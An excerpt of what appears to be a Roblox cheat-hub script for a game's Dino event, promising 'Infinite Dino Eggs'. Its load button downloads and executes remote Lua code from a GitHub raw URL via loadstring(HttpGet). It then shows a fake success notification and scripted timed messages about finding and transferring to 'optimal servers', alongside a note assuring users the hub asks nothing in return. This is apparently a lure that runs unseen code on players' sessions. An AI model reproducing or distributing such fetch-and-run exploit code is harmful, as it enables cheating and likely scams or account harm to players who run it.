...
loadInfiniteDinoEggButton.Text = "Load Dino Event"
...
noteLabel.Text = "Note: Agreeing and Loading Infinite Dino Eggs will need a server restart/rejoin to transfer you in a capable servers in order for all of the vulnerabilities to work. This Hub is keyless and doesn't asks for anything in return."
    ...
    isLoading = true
            ...
            task.spawn(function()
                    local Notification = game.ReplicatedStorage.GameEvents.Notification
                        ...
                        'Dino Event Successfully Loaded!'
                        )
                    end)
            loadstring(game:HttpGet('https://raw.githubusercontent.com/jzeerobloxscripts/grow-a-garden/refs/heads/main/qwerty/dinoeventvuln.lua'))
            ]])
    
    loadInfiniteDinoEggButton.BackgroundColor3 = Color3.fromRGB(100, 100, 100)
    
    loadInfiniteDinoEggButton.Text = "Loading Dino Event..."
    wait(2)
    
    loadInfiniteDinoEggButton.Text = "Finding Optimal Servers..."
    wait(4)
    
    loadInfiniteDinoEggButton.Text = "Transferring You to the Server Found!"
